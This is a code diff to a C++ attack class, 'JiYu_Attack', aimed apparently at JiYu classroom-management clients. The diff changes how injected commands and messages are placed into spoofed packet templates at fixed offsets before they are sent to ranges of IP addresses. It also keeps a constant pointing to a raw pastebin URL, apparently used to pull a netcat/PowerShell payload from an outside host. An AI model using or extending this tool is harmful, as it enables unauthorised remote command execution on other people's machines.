@@ -79,6 +79,7 @@ class JiYu_Attack {
     public:
         JiYu_Attack();
         static const std::vector<BYTE> cmdCodePrefix[4];
+        static const int cmdContentBegin[2];
         enum cmdType {
             MSG = 0,
             CMD,
@@ -410,6 +411,8 @@ const std::vector<BYTE> JiYu_Attack::cmdCodePrefix[4] = {
     },
 };
 
+const int JiYu_Attack::cmdContentBegin[2] = {56, 578};
+
 const std::string JiYu_Attack::nc_ps_url = "https://pastebin.com/raw/u7zARPaN";
 
 std::vector<std::string> JiYu_Attack::IPParser(std::string rawIP) {
@@ -445,7 +448,7 @@ std::vector<std::string> JiYu_Attack::IPParser(std::string rawIP) {
 int JiYu_Attack::sendCmd(std::string rawIP, int port, std::string cmd) {
     int ret = 0;
     auto data = cmdCodePrefix[CMD];
-    data.insert(data.end(), cmd.begin(), cmd.end());
+    memcpy_s(&data[cmdContentBegin[CMD]], (data.size() - cmdContentBegin[CMD]) * sizeof(BYTE), &cmd[0], cmd.size() * sizeof(BYTE));
     auto IPs = IPParser(rawIP);
     for(auto IP: IPs) {
         ret |= client.send(IP, port, data);
@@ -456,7 +459,7 @@ int JiYu_Attack::sendCmd(std::string rawIP, int port, std::string cmd) {
 int JiYu_Attack::sendMsg(std::string rawIP, int port, std::string msg) {
     int ret = 0;
     auto data = cmdCodePrefix[MSG];
-    data.insert(data.end(), msg.begin(), msg.end());
+    memcpy_s(&data[cmdContentBegin[MSG]], (data.size() - cmdContentBegin[MSG]) * sizeof(BYTE), &msg[0], msg.size() * sizeof(BYTE));
     auto IPs = IPParser(rawIP);
     for(auto IP: IPs) {
         ret |= client.send(IP, port, data);
